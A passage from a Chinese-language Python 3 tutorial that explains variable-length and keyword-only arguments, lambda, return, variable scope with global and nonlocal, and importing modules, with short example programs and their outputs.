<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">print</span> (vartuple)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出: </span><br><span class="line">70</span><br><span class="line">(60, 50)</span><br></pre></td></tr></table></figure>
<p>如果在函数调用时没有指定参数，它就是一个空元组。我们也可以不向函数传递未命名的变量。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="keyword">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出:</span><br><span class="line">10</span><br><span class="line">输出:</span><br><span class="line">70</span><br><span class="line">60</span><br><span class="line">50</span><br></pre></td></tr></table></figure>
<p>还有一种就是参数带两个星号 <code>**</code> 基本语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionname</span><span class="params">([formal_args,] **var_args_dict )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure>
<p>加了两个星号 <code>**</code> 的参数会以字典的形式导入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, **vardict )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo(<span class="number">1</span>, a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出: </span><br><span class="line">1</span><br><span class="line">&#123;&#39;a&#39;: 2, &#39;b&#39;: 3&#125;</span><br></pre></td></tr></table></figure>
<p>声明函数时，参数中星号 <code>*</code> 可以单独出现，例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a,b,*,c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br></pre></td></tr></table></figure>
<p>如果单独出现星号 * 后的参数必须用关键字传入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a,b,*,c)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> a+b+c</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>python 使用 lambda 来创建匿名函数。</p>
<p>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。<br>· lambda 只是一个表达式，函数体比 def 简单很多。<br>· lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。<br>· lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>· 虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>lambda 函数的语法只包含一个语句，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure>
<p>如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line">sum = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"相加后的值为 : "</span>, sum( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"相加后的值为 : "</span>, sum( <span class="number">20</span>, <span class="number">20</span> ))</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">相加后的值为 :  30</span><br><span class="line">相加后的值为 :  40</span><br></pre></td></tr></table></figure>
<h3 id="return语句"><a href="#return语句" class="headerlink" title="return语句"></a>return语句</h3><p>return [表达式] 语句用于退出函数，选择性地向调用方返回一个表达式。不带参数值的return语句返回None。之前的例子都没有示范如何返回数值，以下实例演示了 return 语句的用法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">( arg1, arg2 )</span>:</span></span><br><span class="line">   <span class="comment"># 返回2个参数的和."</span></span><br><span class="line">   total = arg1 + arg2</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"函数内 : "</span>, total)</span><br><span class="line">   <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line">total = sum( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外 : "</span>, total)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内 :  30</span><br><span class="line">函数外 :  30</span><br></pre></td></tr></table></figure>
<h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p>
<p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：<br>· L （Local） 局部作用域<br>· E （Enclosing） 闭包函数外的函数中<br>· G （Global） 全局作用域<br>· B （Built-in） 内建作用域<br>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内建中找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = int(<span class="number">2.9</span>)  <span class="comment"># 内建作用域</span></span><br><span class="line"> </span><br><span class="line">g_count = <span class="number">0</span>  <span class="comment"># 全局作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></span><br><span class="line">    o_count = <span class="number">1</span>  <span class="comment"># 闭包函数外的函数中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">        i_count = <span class="number">2</span>  <span class="comment"># 局部作用域</span></span><br></pre></td></tr></table></figure>
<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span> msg = <span class="string">'I am from Runoob'</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>msg</span><br><span class="line"><span class="string">'I am from Runoob'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。</p>
<p>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    msg_inner = <span class="string">'I am from Runoob'</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>msg_inner</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'msg_inner'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>从报错的信息上看，说明了 msg_inner 未定义，无法使用，因为它是局部变量，只有在函数内可以使用。</p>
<h4 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h4><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p>
<p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">( arg1, arg2 )</span>:</span></span><br><span class="line">    <span class="comment">#返回2个参数的和."</span></span><br><span class="line">    total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"函数内是局部变量 : "</span>, total)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line">sum( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外是全局变量 : "</span>, total)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内是局部变量 :  30</span><br><span class="line">函数外是全局变量 :  0</span><br></pre></td></tr></table></figure>
<h4 id="global-和-nonlocal关键字"><a href="#global-和-nonlocal关键字" class="headerlink" title="global 和 nonlocal关键字"></a>global 和 nonlocal关键字</h4><p>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</p>
<p>以下实例修改全局变量 num：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num  <span class="comment"># 需要使用 global 关键字声明</span></span><br><span class="line">    print(num) </span><br><span class="line">    num = <span class="number">123</span></span><br><span class="line">    print(num)</span><br><span class="line">fun1()</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">()</span>:</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num   <span class="comment"># nonlocal关键字声明</span></span><br><span class="line">        num = <span class="number">100</span></span><br><span class="line">        print(num)</span><br><span class="line">    inner()</span><br><span class="line">    print(num)</span><br><span class="line">outer()</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100</span><br><span class="line">100</span><br></pre></td></tr></table></figure>
<p>另外有一种特殊情况，假设下面这段代码被运行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">    print(a)</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
<p>以上程序执行，报错信息如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    test()</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">5</span>, <span class="keyword">in</span> test</span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">UnboundLocalError: local variable <span class="string">'a'</span> referenced before assignment</span><br></pre></td></tr></table></figure>
<p>错误信息为局部作用域引用错误，因为 test 函数中的 a 使用的是局部，未定义，无法修改。</p>
<p>修改 a 为全局变量，通过函数参数传递，可以正常执行输出结果为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(a)</span>:</span></span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line">    print(a)</span><br><span class="line">test(a)</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11</span><br></pre></td></tr></table></figure>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>在前面的几个章节中我们脚本上是用 python 解释器来编程，如果你从 Python 解释器退出再进入，那么你定义的所有的方法和变量就都消失了。</p>
<p>为此 Python 提供了一个办法，把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块。</p>
<p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py。模块可以被别的程序引入，以使用该模块中的函数等功能。这也是使用 python 标准库的方法。</p>
<p>下面是一个使用 python 标准库中模块的例子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># 文件名: using_sys.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'命令行参数如下:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">   print(i)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'\n\nPython 路径为：'</span>, sys.path, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>执行结果如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python using_sys.py 参数<span class="number">1</span> 参数<span class="number">2</span></span><br><span class="line">命令行参数如下:</span><br><span class="line">using_sys.py</span><br><span class="line">参数<span class="number">1</span></span><br><span class="line">参数<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Python 路径为： [<span class="string">'/root'</span>, <span class="string">'/usr/lib/python3.4'</span>, <span class="string">'/usr/lib/python3.4/plat-x86_64-linux-gnu'</span>, <span class="string">'/usr/lib/python3.4/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.4/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br></pre></td></tr></table></figure>
<p>· import sys 引入 python 标准库中的 sys.py 模块；这是引入某一模块的方法。<br>· sys.argv 是一个包含命令行参数的列表。<br>· sys.path 包含了一个 Python 解释器自动查找所需模块的路径的列表。</p>
<h3 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h3><p>想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1[, module2[,... moduleN]</span><br></pre></td></tr></table></figure>
<p>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。</p>
<p>搜索路径是一个解释器会先进行搜索的所有目录的列表。如想要导入模块 support，需要把命令放在脚本的顶端：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: support.py</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span><span class="params">( par )</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Hello : "</span>, par)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<p>test.py 引入 support 模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: test.py</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">"Runoob"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 test.py </span><br><span class="line">Hello :  Runoob</span><br></pre></td></tr></table></figure>
<p>一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</p>
<p>当我们使用import语句的时候，Python解释器是怎样找到对应的文件的呢？</p>
<p>这就涉及到Python的搜索路径，搜索路径是由一系列目录名组成的，Python解释器就依次从这些目录中去寻找所引入的模块。</p>
<p>这看起来很像环境变量，事实上，也可以通过定义环境变量的方式来确定搜索路径。</p>
<p>搜索路径是在Python编译或安装的时候确定的，安装新的库应该也会修改。搜索路径被存储在sys模块中的path变量，做一个简单的实验，在交互式解释器中，输入以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/lib/python3.4'</span>, <span class="string">'/usr/lib/python3.4/plat-x86_64-linux-gnu'</span>, <span class="string">'/usr/lib/python3.4/lib-dynload'</span>, <span class="string">'/usr/local/lib/python3.4/dist-packages'</span>, <span class="string">'/usr/lib/python3/dist-packages'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>sys.path 输出是一个列表，其中第一项是空串’’，代表当前目录（若是从一个脚本中打印出来的话，可以更清楚地看出是哪个目录），亦即我们执行python解释器的目录（对于脚本的话就是运行的脚本所在的目录）。</p>
<p>因此若像我一样在当前目录下存在与要引入模块同名的文件，就会把要引入的模块屏蔽掉。</p>
<p>了解了搜索路径的概念，就可以在脚本中修改sys.path来引入一些不在搜索路径中的模块。</p>
<p>现在，在解释器的当前目录或者 sys.path 中的一个目录里面来创建一个fibo.py的文件，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 斐波那契(fibonacci)数列模块</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span>    <span class="comment"># 定义到 n 的斐波那契数列</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        print(b, end=<span class="string">' '</span>)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    print()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib2</span><span class="params">(n)</span>:</span> <span class="comment"># 返回到 n 的斐波那契数列</span></span><br><span class="line">    result = []</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        result.append(b)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>然后进入Python解释器，使用下面的命令导入这个模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo</span><br></pre></td></tr></table></figure>
<p>这样做并没有把直接定义在fibo中的函数名称写入到当前符号表里，只是把模块fibo的名字写到了那里。</p>
<p>可以使用模块名称来访问函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;fibo.fib(<span class="number">1000</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span> <span class="number">610</span> <span class="number">987</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fibo.fib2(<span class="number">100</span>)</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fibo.__name__</span><br><span class="line"><span class="string">'fibo'</span></span><br></pre></td></tr></table></figure>
<p>如果你打算经常使用一个函数，你可以把它赋给一个本地的名称：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib = fibo.fib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<h3 id="from…import语句"><a href="#from…import语句" class="headerlink" title="from…import语句"></a>from…import语句</h3><p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure>
<p>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这个声明不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来。</p>
<h3 id="from-…-import-语句"><a href="#from-…-import-语句" class="headerlink" title="from … import * 语句"></a>from … import * 语句</h3><p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</p>
<h3 id="深入模块"><a href="#深入模块" class="headerlink" title="深入模块"></a>深入模块</h3><p>模块除了方法定义，还可以包括可执行的代码。这些代码一般用来初始化这个模块。这些代码只有在第一次被导入时才会被执行。</p>
<p>每个模块有各自独立的符号表，在模块内部为所有的函数当作全局符号表来使用。</p>
<p>所以，模块的作者可以放心大胆的在模块内部使用这些全局变量，而不用担心把其他用户的全局变量搞花。</p>
<p>从另一个方面，当你确实知道你在做什么的话，你也可以通过 modname.itemname 这样的表示法来访问模块内的函数。</p>
<p>模块是可以导入其他模块的。在一个模块（或者脚本，或者其他地方）的最前面使用 import 来导入一个模块，当然这只是一个惯例，而不是强制的。被导入的模块的名称将被放入当前操作的模块的符号表中。</p>
<p>还有一种导入的方法，可以使用 import 直接把模块内（函数，变量的）名称导入到当前操作模块。比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这种导入的方法不会把被导入的模块的名称放在当前的字符表中（所以在这个例子里面，fibo 这个名称是没有定义的）。</p>
<p>这还有一种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fibo <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib(<span class="number">500</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br></pre></td></tr></table></figure>
<p>这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</p>
<h3 id="name属性"><a href="#name属性" class="headerlink" title="name属性"></a><strong>name</strong>属性</h3><p>一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用<strong>name</strong>属性来使该程序块仅在该模块自身运行时执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Filename: using_name.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   print(<span class="string">'程序自身在运行'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">'我来自另一模块'</span>)</span><br></pre></td></tr></table></figure>
<p>运行输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python using_name.py</span><br><span class="line">程序自身在运行</span><br></pre></td></tr></table></figure>
